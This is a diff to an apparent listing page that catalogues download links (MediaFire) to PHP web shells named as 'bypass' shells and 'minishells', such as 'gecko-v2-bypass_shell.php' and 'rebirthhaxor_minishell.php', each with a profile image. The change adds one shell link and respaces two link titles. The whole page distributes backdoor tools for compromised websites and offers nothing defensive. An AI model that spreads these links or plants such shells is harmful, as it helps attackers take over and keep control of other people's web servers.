@@ -51,6 +51,9 @@ Date : 10 January 2023
 # <a href="https://www.mediafire.com/file/psc9tggforf50uk/gecko-v2-bypass_shell.php/file">Gecko v2 Bypass</a>
 <img src="https://imgur.com/MV6777I.png" alt="beruangsalju profile">
 
+# <a href="https://www.mediafire.com/file/k5vkn7tl0273in4/rebirthhaxor_minishell.php/file">.: h 4 x 0 r :.</a>
+<img src="https://imgur.com/92qmEXz.png" alt="beruangsalju profile">
+
 # <a href="https://www.mediafire.com/file/yt3aayedn3o2r4j/hi-bypass_shell.php/file">HaxorIsland Bypass</a>
 <img src="https://imgur.com/hPf4QVH.png" alt="beruangsalju profile">
 
@@ -64,7 +67,7 @@ Date : 10 January 2023
 <img src="https://imgur.com/0x1ekVC.png" alt="beruangsalju profile">
 
   
-# <a href="https://www.mediafire.com/file/l4nn9vm1qqgogww/omestpriv8-V2_minishell.php/file">.: M1N1 :.</a>
+# <a href="https://www.mediafire.com/file/l4nn9vm1qqgogww/omestpriv8-V2_minishell.php/file">.: M 1 N 1 :.</a>
 <img src="https://imgur.com/J7RqIMu.png" alt="beruangsalju profile">
   
 # <a href="https://www.mediafire.com/file/r6o2jo7584qml5g/milworm-bypass_shell.php/file">milw0rm Bypass</a>
@@ -88,7 +91,7 @@ Date : 10 January 2023
 # <a href="https://www.mediafire.com/file/ol95m5804ecudjx/devil-bypass_shell.php/file">Priv8 Shell Bypass</a>
 <img src="https://imgur.com/fJnl6o9.png" alt="beruangsalju profile">
 
-# <a href="https://www.mediafire.com/file/uxwiquifhjf4tel/rebirthhaxorV1_shell.php/file">.:R E B I R T H:.</a>
+# <a href="https://www.mediafire.com/file/uxwiquifhjf4tel/rebirthhaxorV1_shell.php/file">.: R E B I R T H :.</a>
 <img src="https://imgur.com/uo6Mgvl.png" alt="beruangsalju profile">
 
 # <a href="https://www.mediafire.com/file/ma0fjtnvp7jpchd/sfm-bypass_shell.php/file">Simple File Manager Bypass</a>
